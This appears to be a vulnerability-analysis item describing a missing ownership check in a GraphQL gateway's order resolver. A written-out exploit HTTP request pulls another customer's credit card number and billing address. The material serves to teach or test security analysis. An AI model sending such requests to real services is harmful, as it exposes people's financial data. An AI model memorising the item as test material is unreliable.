diagnosis: The schema stitching gateway's top-level order resolver retrieves orders solely by ID without checking if order.userId matches context.user.id. When a client requests order(id: '...') { customerBilling { creditCardNumber billingAddress } }, the stitched resolver delegates to the billing service and returns sensitive financial details belonging to other customers.
exploit_request:
POST /graphql HTTP/1.1
Host: gateway.retailhub.io
Authorization: Bearer eyJhbGciOiJIUzI1Ni...
Content-Type: application/json

{
  "query": "query { order(id: \"ord_victim_9912\") { id customerBilling { creditCardNumber billingAddress } } }"
}
